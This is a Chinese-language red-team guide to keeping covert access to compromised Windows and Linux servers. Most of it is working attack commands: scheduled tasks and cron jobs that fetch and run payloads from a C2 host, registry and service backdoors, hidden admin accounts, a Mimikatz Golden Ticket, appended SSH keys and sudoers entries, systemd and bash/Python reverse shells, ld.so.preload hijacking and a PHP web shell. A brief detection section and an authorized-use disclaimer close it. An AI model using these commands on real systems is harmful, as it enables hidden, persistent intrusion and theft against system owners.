# 权限维持（Windows / Linux）全攻略

> 当红队拿下一台服务器后，接下来的关键问题是"如何在不被发现的情况下长期保持访问"。权限维持（Persistence / Post-Exploitation 持久化）就是解决该问题的一系列技巧。

## 1. 权限维持的基本原则

- **隐蔽性优先**：避免使用高风险、特征明显的工具（如远控木马默认端口与证书）
- **多技术组合**：不依赖单一后门，至少准备 2-3 条访问通道
- **凭据优先于 Shell**：窃取凭据、Golden Ticket 往往比 WebShell 更稳定
- **周期性轮换**：C2 域名、端口、服务定期切换

| 类型 | Windows 代表技术 | Linux 代表技术 |
|------|----------------|---------------|
| 计划任务 | Scheduled Task (schtasks) | Crontab |
| 自启动 | 注册表 Run、Startup 文件夹 | systemd 服务、`/etc/profile.d/` |
| 账户后门 | 克隆管理员 (`clone$`)、隐藏账户 | `sudoers` 追加、后门公钥 |
| 服务后门 | Windows 服务（sc create） | 新增 systemd 服务 |
| 文件系统 | ADS 数据流、PE 植入 | `LD_PRELOAD`、`/etc/ld.so.preload` |
| Web 后门 | WebShell（ASPX/ASP/PHP） | WebShell + 反向 Shell |
| 凭据 | KRBTGT 哈希 → Golden Ticket | SSH Key、SSH config |
| 内核 / Rootkit | 未签名驱动（较难） | LKM Rootkit、eBPF |

## 2. Windows 权限维持实战

### 2.1 计划任务 / 定时作业

```bash
# 使用 schtasks 创建计划任务（SYSTEM 权限，每次登录触发）
schtasks /create /tn "WindowsUpdateCheck" \
  /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM /f

# 每小时执行一次
schtasks /create /tn "WindowsHealthCheck" \
  /tr "cmd /c powershell -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://C2/payload.ps1')" \
  /sc hourly /mo 1 /f

# 使用 at 命令（较老系统）
at 23:30 /every:M,T,W,Th,F "cmd /c start payload.exe"

# 使用 PowerShell ScheduledJob
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
  -Argument "-nop -w hidden -c iex(irm http://C2/a.ps1)"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -TaskName "MSHealthCheck" -Action $action -Trigger $trigger -RunLevel Highest
```

### 2.2 注册表自启动项

```
# 常见自启动键值
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
```

```cmd
# 添加到 Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\run.bat" /f

# Userinit 后门（userinit 以逗号分隔）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\pay.exe" /f

# IFEO 调试器后门（当某程序启动时，实际启动调试器）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /c payload.exe & " /f
```

### 2.3 隐藏账户与克隆账户

```cmd
# 创建隐藏账户（末尾加 $ ，net user 默认不显示）
net user backdoor$ Password1! /add
net localgroup administrators backdoor$ /add

# 克隆 Administrator 到 guest（使用 f 和 V 键值，较老技巧）
# 推荐使用工具：mt-clone、shadowmod，或手工导出注册表 SAM 对比

# 远程桌面 (RDP) 启用 + 后台登录
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
```

### 2.4 Windows 服务 / BITS / 远程管理服务

```cmd
# 创建 Windows Service
sc create "WinHealthSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem
sc start WinHealthSvc

# BITSAdmin 下载（BITS 服务是系统合法后台传输工具）
bitsadmin /transfer myJob /download /priority normal http://C2/m.exe C:\Windows\Temp\m.exe

# 启用 WinRM 便于之后横向
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force
```

### 2.5 Golden Ticket / Silver Ticket / Diamond Ticket

```bash
# Mimikatz 生成 Golden Ticket（需要 KRBTGT NTLM 哈希）
mimikatz # kerberos::golden /user:Administrator /domain:target.com \
         /sid:S-1-5-21-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx \
         /krbtgt:55555555555555555555555555555555 \
         /id:500 /groups:513,512,520,518,519 /ptt

# 导入票据后，可通过 DCSync 或 psexec 直接访问任意主机
```

### 2.6 BITS / COM / WMI 事件订阅（隐蔽后门）

```
# WMI 永久事件订阅
# 当指定进程启动 / 用户登录 / 指定时间触发，执行命令
# 常见工具：PowerShell 的 Register-WmiEvent 或 SharpWMI
```

## 3. Linux 权限维持实战

### 3.1 SSH Key 后门 + 配置滥用

```bash
# 追加公钥到目标
echo "ssh-rsa AAAAB3NzaC1yc2... attacker@C2" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 如果目标禁用了 root 登录，则写入普通用户后利用 sudo
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# 利用 SSH Client 配置反向（被动等待用户 SSH 登录触发反弹）
# 在目标的 ~/.bashrc 追加：
# alias ssh='ssh -o ProxyCommand="ncat --proxy-type http --proxy C2:8080 %h %p"'
```

### 3.2 Crontab / 定时任务

```bash
# 每小时反向 Shell
echo "0 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/C2/443 0>&1'" >> /etc/crontab

# 用户级 crontab
(crontab -l 2>/dev/null; echo "*/30 * * * * /tmp/backdoor.sh") | crontab -

# /etc/cron.d/ 目录下创建独立任务
cat > /etc/cron.d/health-check << 'EOF'
SHELL=/bin/bash
*/30 * * * * root curl -s http://C2/payload.sh | bash
EOF
```

### 3.3 SUID 可执行文件 + Shell 伪装

```bash
# 拷贝 /bin/bash 并加上 SUID，后续使用 -p 保留 root 权限
cp /bin/bash /tmp/.bash
chmod u+s /tmp/.bash
# 受害者以非 root 执行：/tmp/.bash -p 即可得到 root shell

# 给 nmap / vim / find 等常见工具加 SUID（部分版本支持 --interactive）
chmod u+s /usr/bin/find
# 普通用户：find /etc/hostname -exec /bin/bash \; -quit
```

### 3.4 `LD_PRELOAD` / `ld.so.preload` 劫持

```bash
# 全局动态链接库劫持（对新启动进程生效）
echo "/tmp/evil.so" > /etc/ld.so.preload

# 或者针对特定用户
echo "export LD_PRELOAD=/tmp/evil.so" >> /root/.bashrc
echo "export LD_PRELOAD=/tmp/evil.so" >> /root/.profile

# evil.so 通常劫持 accept / connect / fopen / read 等敏感函数，
# 实现命令执行、隐藏进程、隐藏文件
```

### 3.5 systemd 服务后门

```bash
# /etc/systemd/system/backdoor.service
[Unit]
Description=System Health Check Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/C2/443 0>&1'
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target

# 启用并启动
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

### 3.6 其他 Linux 持久化路径

| 路径 | 作用 |
|------|------|
| `/etc/profile.d/evil.sh` | 所有用户登录时执行 |
| `/root/.bashrc`、`/root/.profile` | root 用户登录时执行 |
| `/etc/bash.bashrc` | 全局 bash 启动脚本 |
| `/etc/rc.local` | 开机自启（部分旧发行版） |
| `/etc/init.d/` | SysV init 脚本 |
| `~/.ssh/rc` | SSH 登录触发的钩子脚本 |
| `/var/spool/cron/crontabs/root` | root 的 crontab |
| `/usr/lib/systemd/system/*.service` | systemd 服务目录 |
| `PKEXEC / Polkit 配置缺陷` | 低权限用户提权到 root（CVE-2021-4034 等） |

### 3.7 Web Shell 与反向 Shell

```bash
# 反向 Shell（Bash 版）
bash -i >& /dev/tcp/C2/443 0>&1

# Python 版
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("C2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'

# PHP Web Shell（简短版）
<?php system($_REQUEST['c']); ?>

# Python PTY 升级交互式
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 4. 防御视角：如何检测 / 反制权限维持

1. **监控敏感注册表项**：`HKLM\...\Run`、`IFEO`、`Winlogon\Userinit`
2. **审计登录事件**：Windows 4625/4624、Linux `/var/log/auth.log`
3. **计划任务审计**：`schtasks /query /fo list /v`、`crontab -l`、`systemctl list-units --type=service`
4. **新服务 / 新账户告警**：`net user`、`sc query type= service`
5. **SSH Key 轮替**：定期审计 `authorized_keys`
6. **EDR / HIDS**：监控关键系统调用、文件系统变更
7. **最小权限原则**：Web 进程不可写入系统目录

---

> 权限维持本质上是一场"躲猫猫"——红队希望隐藏在系统的角落里，蓝队则需要把这些角落一个个翻出来。本指南仅用于合法授权的红队演练与企业内部安全审计，严禁用于未授权的攻击活动。
